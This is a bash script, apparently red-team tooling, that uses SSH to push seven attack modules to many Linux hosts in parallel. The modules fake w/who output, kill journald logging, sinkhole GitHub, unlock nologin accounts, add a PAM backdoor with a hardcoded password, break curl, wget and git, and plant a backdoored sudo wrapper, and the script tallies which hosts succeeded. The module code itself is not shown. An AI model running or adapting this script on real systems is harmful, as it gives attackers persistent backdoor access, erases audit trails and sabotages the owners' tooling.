#!/usr/bin/env bash
# let-the-madness-begin.sh
#
# 1. Pull latest tooling from GitHub
# 2. Mass-deploy to all Linux hosts in parallel:
#      - compromise-who   (fake w + who output)
#      - nuke-journal     (kill all journald logging)
#      - sinkhole         (dnsmasq GitHub sinkhole — fast)
#      - infinite-users   (unlock all nologin accounts)
#      - pam-backdoor     (auth as any user with rt2025!delta)
#      - break-net-tools  (breaks curl, wget, git on targets)
#      - sudo-binary      (backdoored sudo wrapper)
#
# Usage:
#   ./let-the-madness-begin.sh [OPTIONS]
#
# Options:
#   -u, --user USER       SSH username (default: prompted)
#   -P, --port PORT       SSH port (default: 22)
#       --no-sudo         Don't use sudo (default when user is root)
#   -j, --jobs N          Parallel jobs per wave (default: 9)
#       --dry-run         Preview commands without running
#   -h, --help            Show this help

set -euo pipefail

RT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MASS="${RT_DIR}/mass-deploy.sh"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
BOLD='\033[1m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}${BOLD}━━  $*  ━━${NC}\n"; }

# ── defaults ──────────────────────────────────────────────────────────────────
SSH_USER=""
SSH_PASS=""
SSH_PORT="22"
NO_SUDO=0      # default off: use sudo unless --no-sudo passed or user is root
MAX_JOBS=9
DRY_RUN=0
EXTRA_OPTS=()

usage() {
    sed -n '/^# Usage:/,/^[^#]/{/^#/{s/^# \?//;p};/^[^#]/q}' "$0"
    exit "${1:-0}"
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u|--user)      SSH_USER="$2"; shift 2 ;;
        -P|--port)      SSH_PORT="$2"; shift 2 ;;
        --no-sudo)      NO_SUDO=1;     shift   ;;
        -j|--jobs)      MAX_JOBS="$2"; shift 2 ;;
        --dry-run)      DRY_RUN=1;     shift   ;;
        -h|--help)      usage 0                ;;
        *) err "Unknown option: $1"; usage 1   ;;
    esac
done

# ── prompt for user if not provided ──────────────────────────────────────────
if [[ -z "$SSH_USER" ]]; then
    read -rp $'\033[0;36m[?]\033[0m SSH user for all targets [root]: ' SSH_USER
    SSH_USER="${SSH_USER:-root}"
fi
info "SSH user: ${SSH_USER}"

# ── prompt for password ──────────────────────────────────────────────────────
read -rsp $'\033[0;36m[?]\033[0m SSH password (also used as sudo password): ' SSH_PASS
echo
export RT_SSH_PASS="$SSH_PASS"
export RT_SUDO_PASS="$SSH_PASS"

# build shared mass-deploy flags
[[ -n "$SSH_PORT" ]] && EXTRA_OPTS+=(-P "$SSH_PORT")
[[ $NO_SUDO -eq 1 ]] && EXTRA_OPTS+=(--no-sudo)
[[ $DRY_RUN -eq 1 ]] && EXTRA_OPTS+=(--dry-run)

md() {
    "$MASS" -u "$SSH_USER" -j "$MAX_JOBS" "${EXTRA_OPTS[@]}" "$@"
}

# ── receipt tracking ──────────────────────────────────────────────────────────
RECEIPT_LABELS=()
RECEIPT_PASSED=()
RECEIPT_FAILED=()
RECEIPT_TOTAL=()
RECEIPT_REASONS=()

wave() {
    local label="$1"; shift
    RECEIPT_LABELS+=("$label")
    local tmpfile
    tmpfile=$(mktemp)
    local rc=0
    md "$@" 2>&1 | tee "$tmpfile" || rc=${PIPESTATUS[0]}

    # parse "Done: X passed, Y failed (of N hosts)" from mass-deploy output
    local summary_line
    summary_line=$(grep -oE "[0-9]+ passed, [0-9]+ failed \(of [0-9]+ hosts\)" "$tmpfile" 2>/dev/null | tail -1)
    local passed=0 failed=0 total=0
    if [[ -n "$summary_line" ]]; then
        passed=$(echo "$summary_line" | grep -oE "^[0-9]+")
        failed=$(echo "$summary_line" | grep -oE "^[0-9]+" <<< "${summary_line#* passed, }")
        total=$(echo  "$summary_line" | grep -oE "\(of ([0-9]+)" | grep -oE "[0-9]+")
    fi
    RECEIPT_PASSED+=("$passed")
    RECEIPT_FAILED+=("$failed")
    RECEIPT_TOTAL+=("$total")

    # extract unique error reasons (only for hosts that actually failed with a real error)
    local reason
    reason=$(grep -oE "(Permission denied|No route to host|Connection refused|Connection timed out|Host key verification failed|No such file or directory)" \
                 "$tmpfile" 2>/dev/null \
             | sort -u | head -3 | tr '\n' '  ' | sed 's/[[:space:]]*$//')
    RECEIPT_REASONS+=("$reason")
    rm -f "$tmpfile"
}

print_receipt() {
    echo
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${CYAN}  RECEIPT${NC}"
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    local all_ok=0 some_ok=0 none_ok=0
    for i in "${!RECEIPT_LABELS[@]}"; do
        local label="${RECEIPT_LABELS[$i]}"
        local passed="${RECEIPT_PASSED[$i]}"
        local failed="${RECEIPT_FAILED[$i]}"
        local total="${RECEIPT_TOTAL[$i]}"
        local reason="${RECEIPT_REASONS[$i]}"
        local score="${passed}/${total}"
        if [[ "$passed" -eq "$total" && "$total" -gt 0 ]]; then
            echo -e "  ${GREEN}[OK  ${score}]${NC}  ${BOLD}${label}${NC}"
            (( all_ok++ )) || true
        elif [[ "$passed" -gt 0 ]]; then
            echo -e "  ${YELLOW}[PART ${score}]${NC} ${BOLD}${label}${NC}"
            [[ -n "$reason" ]] && echo -e "            ${YELLOW}${reason}${NC}"
            (( some_ok++ )) || true
        else
            echo -e "  ${RED}[FAIL ${score}]${NC} ${BOLD}${label}${NC}"
            [[ -n "$reason" ]] && echo -e "            ${YELLOW}${reason}${NC}"
            (( none_ok++ )) || true
        fi
    done
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${GREEN}${all_ok} full${NC}   ${YELLOW}${some_ok} partial${NC}   ${RED}${none_ok} failed${NC}"
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo
}

# ── banner ────────────────────────────────────────────────────────────────────
echo -e "${RED}${BOLD}"
cat << 'EOF'
 __      _____         _      _                                 
 \ \    / ____|       | |    | |                                
  \ \  | (___   ___   | | ___| |_                               
   > >  \___ \ / _ \  | |/ _ \ __|                              
  / /   ____) | (_) | | |  __/ |_                               
 /_/   |_____/ \___/  |_|\___|\__|        _                     
 \ \   | | | |          |  \/  |         | |                    
  \ \  | |_| |__   ___  | \  / | __ _  __| |_ __   ___  ___ ___ 
   > > | __| '_ \ / _ \ | |\/| |/ _` |/ _` | '_ \ / _ \/ __/ __|
  / /  | |_| | | |  __/ | |  | | (_| | (_| | | | |  __/\__ \__ \
 /_/    \__|_| |_|\___| |_|  |_|\__,_|\__,_|_| |_|\___||___/___/
 \ \   |  _ \           (_)                                     
  \ \  | |_) | ___  __ _ _ _ __                                 
   > > |  _ < / _ \/ _` | | '_ \                                
  / /  | |_) |  __/ (_| | | | | |                               
 /_/   |____/ \___|\__, |_|_| |_|                               
                    __/ |                                       
                   |___/                                        
EOF
echo -e "${NC}"

# ── step 1: compromise w + who ────────────────────────────────────────────────
hdr "Step 1/7 — Faking w + who"
info "Deploying compromise-who to all Linux hosts…"
wave "compromise-who" compromise-who install

# ── step 2: nuke journal ──────────────────────────────────────────────────────
hdr "Step 2/7 — Nuking journald"
info "Deploying nuke-journal to all Linux hosts…"
wave "nuke-journal   " nuke-journal install

# ── step 3: github sinkhole ───────────────────────────────────────────────────
hdr "Step 3/7 — GitHub dnsmasq sinkhole"
info "Deploying sinkhole to all Linux hosts…"
wave "sinkhole       " sinkhole install

# ── step 4: infinite users ────────────────────────────────────────────────────
hdr "Step 4/7 — Hijacking nologin accounts"
info "Deploying infinite-users to all Linux hosts…"
wave "infinite-users " infinite-users install

# ── step 5: PAM backdoor ──────────────────────────────────────────────────────
hdr "Step 5/7 — PAM backdoor"
info "Deploying pam-backdoor to all Linux hosts…"
wave "pam-backdoor   " pam-backdoor install

# ── step 6: break net tools ───────────────────────────────────────────────────
hdr "Step 6/7 — Breaking curl, wget, git"
info "Deploying break-net-tools to all Linux hosts…"
wave "break-net-tools" break-net-tools install

# ── step 7: sudo binary backdoor ──────────────────────────────────────────────
hdr "Step 7/7 — Backdooring sudo"
info "Deploying sudo-binary to all Linux hosts…"
wave "sudo-binary    " sudo-binary install

# ── receipt ───────────────────────────────────────────────────────────────────
print_receipt
echo -e "${GREEN}${BOLD}  Madness achieved.${NC}"
echo
